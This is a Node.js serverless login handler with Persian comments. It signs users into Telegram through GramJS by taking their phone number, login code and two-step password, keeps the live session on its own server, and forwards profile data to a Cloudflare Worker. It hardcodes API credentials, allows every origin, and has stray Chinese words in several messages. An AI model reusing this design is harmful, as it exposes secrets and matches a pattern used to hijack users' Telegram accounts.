// login.js
const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { Api } = require("telegram/tl");

// اطلاعات API
const apiId = 20456083;
const apiHash = '16db2b0cdd40db7c91511ca151115af5';

// آدرس Cloudflare Worker
const WORKER_URL = "https://tell.a09627301.workers.dev";

// ذخیره sessionها - در محیط production از دیتابیس استفاده کنید
const sessions = {};

module.exports = async (req, res) => {
  // تنظیم هدر برای CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // مدیریت درخواست‌های OPTIONS برای CORS
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // فقط درخواست‌های POST را پردازش کن
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method Not Allowed" });
  }

  try {
    let body = {};
    try {
      body = JSON.parse(req.body || '{}');
    } catch (e) {
      body = req.body;
    }
    
    const { step, phone, code, password, phoneCodeHash, sessionId } = body;

    // اگر sessionId ارسال شده، بررسی کن
    if (sessionId) {
      try {
        const response = await fetch(`${WORKER_URL}/api/check-session`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId })
        });
        
        const sessionData = await response.json();
        
        if (sessionData.success) {
          return res.status(200).json({
            success: true,
            message: "کاربر از قبل وارد شده است",
            user: sessionData.user,
            sessionId: sessionData.sessionId
          });
        }
      } catch (error) {
        console.error("Session check error:", error);
        // ادامه به فرآیند لاگین معمول
      }
    }

    if (!phone) {
      return res.status(400).json({ success: false, message: "شماره تلفن لازم است" });
    }

    // اگر session برای این شماره وجود ندارد، ایجاد کن
    if (!sessions[phone]) {
      const stringSession = new StringSession("");
      sessions[phone] = new TelegramClient(stringSession, apiId, apiHash, {
        connectionRetries: 5,
      });
      
      // اتصال کلاینت
      await sessions[phone].connect();
    }

    const client = sessions[phone];

    if (step === "sendCode") {
      try {
        // ارسال کد تأیید
        const result = await client.invoke(
          new Api.auth.SendCode({
            phoneNumber: phone,
            settings: new Api.CodeSettings({}),
            apiId: parseInt(apiId),
            apiHash: apiHash,
          })
        );
        
        return res.status(200).json({ 
          success: true, 
          message: "کد تأیید ارسال شد. لطفاً کد دریافتی را وارد کنید.",
          phoneCodeHash: result.phoneCodeHash 
        });
      } catch (error) {
        console.error("Send code error:", error);
        return res.status(400).json({ 
          success: false, 
          message: error.errorMessage === "PHONE_NUMBER_INVALID" 
            ? "شماره تلفن نامعتبر است" 
            : "خطا در ارسال کد تأیید. لطفاً دوباره尝试 کنید." 
        });
      }
    }

    if (step === "verifyCode") {
      if (!code) {
        return res.status(400).json({ success: false, message: "کد تأیید لازم است" });
      }

      try {
        // ورود با کد
        await client.invoke(
          new Api.auth.SignIn({
            phoneNumber: phone,
            phoneCodeHash: phoneCodeHash,
            phoneCode: code,
          })
        );
        
        // دریافت اطلاعات کاربر پس از ورود موفق
        const user = await client.getMe();
        const userData = {
          id: user.id,
          firstName: user.firstName,
          lastName: user.lastName,
          username: user.username,
          phone: user.phone
        };
        
        // ذخیره session در Cloudflare D1
        try {
          const response = await fetch(`${WORKER_URL}/api/save-session`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              phone, 
              userData 
            })
          });
          
          const sessionResult = await response.json();
          
          if (sessionResult.success) {
            return res.status(200).json({ 
              success: true, 
              message: "ورود موفقیت‌آمیز بود",
              user: userData,
              sessionId: sessionResult.sessionId
            });
          }
        } catch (sessionError) {
          console.error("Session save error:", sessionError);
          // حتی اگر ذخیره session失敗 شد، باز هم ورود موفق است
          return res.status(200).json({ 
            success: true, 
            message: "ورود موفقیت‌آمیز بود (اما session ذخیره نشد)",
            user: userData
          });
        }
      } catch (error) {
        // اگر نیاز به رمز دومرحله‌ای باشد
        if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
          return res.status(200).json({ 
            success: false, 
            message: "حساب شما دارای رمز دومرحله‌ای است. لطفاً رمز خود را وارد کنید.",
            needPassword: true 
          });
        }
        
        // خطاهای دیگر
        console.error("Verify code error:", error);
        let errorMessage = "خطا در تأیید کد. لطفاً دوباره尝试 کنید.";
        
        if (error.errorMessage === "PHONE_CODE_INVALID") {
          errorMessage = "کد تأیید نامعتبر است.";
        } else if (error.errorMessage === "PHONE_CODE_EXPIRED") {
          errorMessage = "کد تأیید منقضی شده است. لطفاً کد جدیدی دریافت کنید.";
        }
        
        return res.status(400).json({ 
          success: false, 
          message: errorMessage
        });
      }
    }

    if (step === "checkPassword" && password) {
      try {
        // بررسی رمز دومرحله‌ای
        await client.invoke(
          new Api.auth.CheckPassword({
            password: password,
          })
        );
        
        // دریافت اطلاعات کاربر پس از ورود موفق
        const user = await client.getMe();
        const userData = {
          id: user.id,
          firstName: user.firstName,
          lastName: user.lastName,
          username: user.username,
          phone: user.phone
        };
        
        // ذخیره session در Cloudflare D1
        try {
          const response = await fetch(`${WORKER_URL}/api/save-session`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              phone, 
              userData 
            })
          });
          
          const sessionResult = await response.json();
          
          if (sessionResult.success) {
            return res.status(200).json({ 
              success: true, 
              message: "ورود موفقیت‌آمیز بود",
              user: userData,
              sessionId: sessionResult.sessionId
            });
          }
        } catch (sessionError) {
          console.error("Session save error:", sessionError);
          // حتی اگر ذخیره session失敗 شد، باز هم ورود موفق است
          return res.status(200).json({ 
            success: true, 
            message: "ورود موفقیت‌آمیز بود (اما session ذخیره نشد)",
            user: userData
          });
        }
      } catch (error) {
        console.error("Password check error:", error);
        return res.status(400).json({ 
          success: false, 
          message: error.errorMessage === "PASSWORD_HASH_INVALID" 
            ? "رمز دومرحله‌ای نامعتبر است" 
            : "خطا در بررسی رمز. لطفاً دوباره尝试 کنید."
        });
      }
    }

    return res.status(400).json({ success: false, message: "درخواست نامعتبر" });
  } catch (err) {
    console.error("Error in login API:", err);
    return res.status(500).json({ 
      success: false, 
      message: err.message || "خطای سرور داخلی" 
    });
  }
};
